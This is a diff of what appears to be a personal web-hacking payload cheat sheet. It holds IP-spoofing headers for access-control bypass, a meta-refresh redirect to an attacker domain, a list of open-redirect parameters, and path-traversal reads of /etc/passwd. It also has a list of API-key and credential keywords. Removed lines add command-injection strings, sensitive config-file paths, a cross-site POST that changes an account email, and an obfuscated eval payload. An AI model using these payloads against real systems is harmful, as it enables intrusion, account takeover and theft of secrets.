@@ -1,18 +1,26 @@
-FIX WT CURSOR DISAPEAR
-echo -en "\e[?25h"
 
 
 
-X-Forwarded-Host
-X-Forwarded-Port
-X-Forwarded-Scheme
-Origin: 
-nullOrigin: [siteDomain].attacker.com
+X-Rewrite-Url:
+X-Original-Url:
+X-Forwarded-Host:
+X-Forwarded-Port:
+X-Forwarded-Scheme:
 X-Frame-Options: Allow
 X-Forwarded-For: 127.0.0.1
 X-Client-IP: 127.0.0.1
-Client-IP: 127.0.0.1
+X-Custom-IP-Authorizition: 127.0.0.1
+X-Forwarded-For: 127.0.0.2
+X-Originting-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.3
+X-Remote-Addr: 127.0.0.4
+X-Client-IP: 127.0.0.5
+X-Host: 127.0.0.6
+X-Forwarded-Host: 127.0.0.1
 
+{api_key, api-key, apikey , api , access , AccessToken , gmap , gmaps , algolia_api_key , credentials, etc..}
+
+debug/pprof/FUZZ
 
 0;url=http:&#x2F;&#x2F;www.evilzone.com"HTTP-EQUIV="refresh"any=".arexport
 
@@ -30,11 +38,6 @@ Try -
 '/something.json
 '/something/?anything'
 '/something#'
-Works sometimes
-Sign of the horns
-
-Happy hacking....!!! 
-
 
 Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
 
@@ -48,17 +51,6 @@ Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
 
 
 
-X-Custom-IP-Authorizition: 127.0.0.1
-X-Forwarded-For: 127.0.0.2
-X-Originting-IP: 127.0.0.1
-X-Remote-IP: 127.0.0.3
-X-Remote-Addr: 127.0.0.4
-X-Client-IP: 127.0.0.5
-X-Host: 127.0.0.6
-X-Forwarded-Host: 127.0.0.1
-
-
-
 
 
 .*\.google\.com 
@@ -67,98 +59,25 @@ X-Forwarded-Host: 127.0.0.1
 .*\.mozilla\.com
 .*\.pki\.goog
 
-/api/v1/account/accounts/summaries
-
-/api/v1/account/oauth/token
-
-/api/v1/account/oauth/ticket
-
-/api/v1/account/permissions
-
-/api/v1/account/user
-
-/api/v1/account/user/assets
-
-/api/v1/account/user/delete
-
-/api/v1/account/user/profile
-
-/StateNameServer.exe.config
-/Sysindex.config
-/System.config
-/Web.confide
-/webconfig.php
-/webconfig.txt.php
-/wp-config.php
-/wp-includes/css/wp-config.php
-/wp-includes/fonts/wp-config.php
-/wp-includes/modules/wp-config.pop
-/xamlSyntax.config
-/xunit.console.exe.config
-/NHibernate.config
-/NLog.config
-/nunit-agent.exe.config
-/nunit-gui.exe.config
-/nunit-x86.exe.config
-/nunit.exe.config
-/Rhino.Commons.NHibernate.dll.config
-/runFile.exe.config
-/sconfig.php
-/services.config
 
 /{payload}
-
 ?next={payload}
-
 ?url={payload}
-
 ?target={payload}
-
 ?rurl={payload}
-
 ?dest={payload}
-
 ?destination={payload}
-
 ?redir={payload}
-
 ?redirect_url={payload}
-
 ?redirect={payload}
-
 /cgi-bin/redirect.cgi?{payload}
-
 ?out={payload}
-
 ?view={payload}
-
 /login?to={payload}
-
 ?image_url={payload}
-
 ?go={payload}
-
 ?return={payload}
-
 ?checkout_url={payload}
-
 ?continue={payload}
-
 ?return_path={payload}
 
-\..\WINDOWS\win.ini
-..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
-.?\.?\.?\etc\passwd
-../../boot.ini
-%0a/bin/cat%20/etc/passwd
-\\&apos;/bin/cat%20/etc/passwd\\&apos;
-..%c1%afetc%c1%afpasswd
-
-$.post("https://mixpanel.com/account/update_name/",{email: "shg33k@gmail.com"},function(data,status){console.log("Data: " + data + "\nStatus: " + status);})
-with(String){eval(fromCharCode(36,46,112,111,115,116,...))}
-
-
-/e?c/?asswd
-/e*c/*asswd
-/??c/?asswd
-/??c/?assw?
